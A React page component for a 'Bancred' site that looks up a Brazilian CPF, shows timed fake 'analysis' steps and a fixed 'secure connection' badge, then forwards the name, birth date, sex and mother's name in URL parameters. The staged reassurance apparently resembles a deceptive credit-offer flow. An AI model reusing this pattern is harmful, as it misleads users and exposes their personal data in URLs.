import { useEffect, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { UserCheck, Check, Loader2 } from "lucide-react";
import logo from "@/assets/bancred-logo.png";
import ConsultorCard from "@/components/ConsultorCard";
import { supabase } from "@/integrations/supabase/client";
import PartnerBanksFooter from "@/components/PartnerBanksFooter";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

type StepState = "loading" | "done";

const Step = ({ label, state }: { label: string; state: StepState }) => {
  const isDone = state === "done";

  // Loading = azul; Done = verde
  const cardBg = isDone ? "#F0FDF4" : "#EFF6FF";
  const cardBorder = isDone ? "#BBF7D0" : "#BFDBFE";
  const iconBg = isDone ? "#22C55E" : "#3B82F6";
  const pingBg = isDone ? "#4ADE80" : "#60A5FA";
  const textColor = isDone ? "#15803D" : "#1D4ED8";
  const dotColor = isDone ? "#4ADE80" : "#60A5FA";

  return (
    <div
      style={{
        display: "flex",
        alignItems: "center",
        gap: 16,
        padding: 12,
        borderRadius: 12,
        background: cardBg,
        border: `1px solid ${cardBorder}`,
        transition: "all 0.5s ease",
      }}
    >
      {/* Icon w/ ping */}
      <div
        style={{
          position: "relative",
          width: 40,
          height: 40,
          borderRadius: "50%",
          background: iconBg,
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          boxShadow: "0 4px 10px rgba(0,0,0,0.12)",
          flexShrink: 0,
        }}
      >
        {isDone ? (
          <Check width={20} height={20} color="#FFFFFF" strokeWidth={2.5} />
        ) : (
          <Loader2
            width={20}
            height={20}
            color="#FFFFFF"
            style={{ animation: "bc-spin 1s linear infinite" }}
          />
        )}
        <span
          style={{
            position: "absolute",
            inset: 0,
            borderRadius: "50%",
            background: pingBg,
            opacity: 0.75,
            animation: "bc-ping 1.5s cubic-bezier(0,0,0.2,1) infinite",
          }}
        />
      </div>

      {/* Label */}
      <div style={{ flex: 1, minWidth: 0 }}>
        <p
          style={{
            fontWeight: 500,
            color: textColor,
            fontSize: 14,
            display: "flex",
            alignItems: "center",
            gap: 6,
          }}
        >
          <span>{label}</span>
          {isDone && <span style={{ color: "#16A34A" }}>✓</span>}
        </p>
      </div>

      {/* Right dot */}
      <div
        style={{
          width: 8,
          height: 8,
          borderRadius: "50%",
          background: dotColor,
          animation: "bc-pulse 2s ease-in-out infinite",
          flexShrink: 0,
        }}
      />
    </div>
  );
};

const Analise = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const [step1, setStep1] = useState<StepState>("loading");
  const [step2, setStep2] = useState<StepState>("loading");
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  useEffect(() => {
    let cancelled = false;
    const cpf = searchParams.get("cpf") ?? "";
    const nomeFromUrl = searchParams.get("nome") ?? "";

    const startedAt = Date.now();
    const minDelay = (ms: number) =>
      new Promise<void>((r) =>
        setTimeout(r, Math.max(0, ms - (Date.now() - startedAt))),
      );

    (async () => {
      try {
        const { data, error } = await supabase.functions.invoke("consulta-cpf", {
          body: { cpf },
        });

        await minDelay(1500);
        if (cancelled) return;
        setStep1("done");

        if (error || !data?.ok) {
          const msg =
            (data && (data.error as string)) ||
            error?.message ||
            "Não foi possível consultar este CPF.";
          await minDelay(2800);
          if (cancelled) return;
          setErrorMsg(msg);
          return;
        }

        await minDelay(2800);
        if (cancelled) return;
        setStep2("done");

        const qs = new URLSearchParams();
        if (cpf) qs.set("cpf", cpf);
        const finalNome = (data.nome as string) || nomeFromUrl;
        if (finalNome) qs.set("nome", finalNome);
        if (data.nascimento) qs.set("nascimento", data.nascimento as string);
        if (data.sexo) qs.set("sexo", data.sexo as string);
        if (data.mae) qs.set("mae", data.mae as string);

        await minDelay(3500);
        if (cancelled) return;
        navigate(`/pessoa?${qs.toString()}`, { replace: true });
      } catch (e) {
        if (cancelled) return;
        setErrorMsg(
          e instanceof Error ? e.message : "Erro inesperado ao consultar CPF.",
        );
      }
    })();

    return () => {
      cancelled = true;
    };
  }, [navigate, searchParams]);

  return (
    <div
      style={{
        minHeight: "100dvh",
        display: "flex",
        flexDirection: "column",
        background: "#FFFFFF",
        fontFamily: fontStack,
        color: "#111827",
        WebkitFontSmoothing: "antialiased",
      }}
    >
      <style>{`
        @keyframes bc-spin { to { transform: rotate(360deg); } }
        @keyframes bc-ping {
          75%, 100% { transform: scale(2); opacity: 0; }
        }
        @keyframes bc-pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.5; }
        }
        @keyframes bc-spin-slow { to { transform: rotate(360deg); } }
        @keyframes bc-bg-pulse {
          0%, 100% { opacity: 0.2; }
          50% { opacity: 0.35; }
        }
      `}</style>

      <header
        style={{
          background: "#FFFFFF",
          borderBottom: "1px solid #E5E7EB",
          padding: "16px 16px",
          textAlign: "center",
          paddingTop: "calc(16px + env(safe-area-inset-top))",
        }}
      >
        <img
          src={logo}
          alt="Bancred"
          style={{ height: 90, width: "auto", display: "inline-block", objectFit: "contain" }}
        />
      </header>

      <main
        style={{
          flex: 1,
          background: "#F9FAFB",
          padding: "48px 16px",
        }}
      >
        <div style={{ maxWidth: 448, margin: "0 auto" }}>
          <div style={{ marginBottom: 16 }}>
            <ConsultorCard />
          </div>
          {/* Card with gradient */}
          <div
            style={{
              position: "relative",
              overflow: "hidden",
              borderRadius: 16,
              background: "linear-gradient(135deg, #EFF6FF 0%, #DBEAFE 100%)",
              padding: 24,
              border: "1px solid #BFDBFE",
              boxShadow: "0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -4px rgba(0,0,0,0.1)",
            }}
          >
            {/* Animated gradient overlay */}
            <div
              style={{
                position: "absolute",
                inset: 0,
                opacity: 0.2,
                pointerEvents: "none",
                background: "linear-gradient(90deg, rgba(96,165,250,0.2), rgba(37,99,235,0.2))",
                animation: "bc-bg-pulse 2s ease-in-out infinite",
              }}
            />

            <div style={{ position: "relative", zIndex: 1 }}>
              {/* Avatar */}
              <div style={{ textAlign: "center", marginBottom: 24 }}>
                <div
                  style={{
                    position: "relative",
                    width: 64,
                    height: 64,
                    margin: "0 auto 16px",
                  }}
                >
                  {/* Spinning gradient ring */}
                  <div
                    style={{
                      position: "absolute",
                      inset: 0,
                      borderRadius: "50%",
                      background: "linear-gradient(45deg, #3B82F6, #1D4ED8)",
                      animation: "bc-spin-slow 2s linear infinite",
                    }}
                  />
                  {/* White inner circle with icon */}
                  <div
                    style={{
                      position: "absolute",
                      inset: 4,
                      borderRadius: "50%",
                      background: "#FFFFFF",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <UserCheck
                      width={24}
                      height={24}
                      color="#2563EB"
                      style={{ animation: "bc-pulse 2s ease-in-out infinite" }}
                    />
                  </div>
                  {/* Top ping dot */}
                  <div
                    style={{
                      position: "absolute",
                      top: -4,
                      left: "50%",
                      transform: "translateX(-50%)",
                      width: 12,
                      height: 12,
                      background: "#60A5FA",
                      borderRadius: "50%",
                      animation: "bc-ping 1.5s cubic-bezier(0,0,0.2,1) infinite",
                    }}
                  />
                  {/* Bottom ping dot */}
                  <div
                    style={{
                      position: "absolute",
                      bottom: -4,
                      left: "50%",
                      transform: "translateX(-50%)",
                      width: 8,
                      height: 8,
                      background: "#3B82F6",
                      borderRadius: "50%",
                      animation: "bc-ping 1.5s cubic-bezier(0,0,0.2,1) infinite",
                      animationDelay: "0.5s",
                    }}
                  />
                </div>

                <h3
                  style={{
                    fontSize: 18,
                    fontWeight: 700,
                    color: "#1F2937",
                    marginBottom: 8,
                  }}
                >
                  Analisando seus dados
                </h3>
                <p style={{ fontSize: 14, color: "#4B5563" }}>Processando informações...</p>
              </div>

              {/* Steps */}
              <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
                <Step label="Consultando banco de dados" state={step1} />
                <Step label="Finalizando verificação" state={step2} />
              </div>

              {errorMsg && (
                <div
                  style={{
                    marginTop: 16,
                    padding: 14,
                    borderRadius: 12,
                    background: "#FEF2F2",
                    border: "1px solid #FECACA",
                    color: "#991B1B",
                    fontSize: 14,
                  }}
                >
                  <strong style={{ display: "block", marginBottom: 4 }}>
                    Não foi possível continuar
                  </strong>
                  <span style={{ color: "#7F1D1D" }}>{errorMsg}</span>
                  <button
                    onClick={() => navigate("/cpf")}
                    style={{
                      marginTop: 12,
                      width: "100%",
                      padding: "10px 14px",
                      borderRadius: 10,
                      background: "#DC2626",
                      color: "#FFFFFF",
                      border: "none",
                      fontWeight: 600,
                      cursor: "pointer",
                      fontFamily: fontStack,
                    }}
                  >
                    Tentar outro CPF
                  </button>
                </div>
              )}

              {/* Secure connection badge */}
              <div style={{ marginTop: 24, textAlign: "center" }}>
                <div
                  style={{
                    display: "inline-flex",
                    alignItems: "center",
                    gap: 8,
                    fontSize: 12,
                    color: "#4B5563",
                    background: "rgba(255,255,255,0.6)",
                    padding: "8px 12px",
                    borderRadius: 999,
                  }}
                >
                  <span
                    style={{
                      width: 8,
                      height: 8,
                      background: "#22C55E",
                      borderRadius: "50%",
                      animation: "bc-pulse 2s ease-in-out infinite",
                    }}
                  />
                  <span>Conexão segura ativa</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      <PartnerBanksFooter />
    </div>
  );
};

export default Analise;
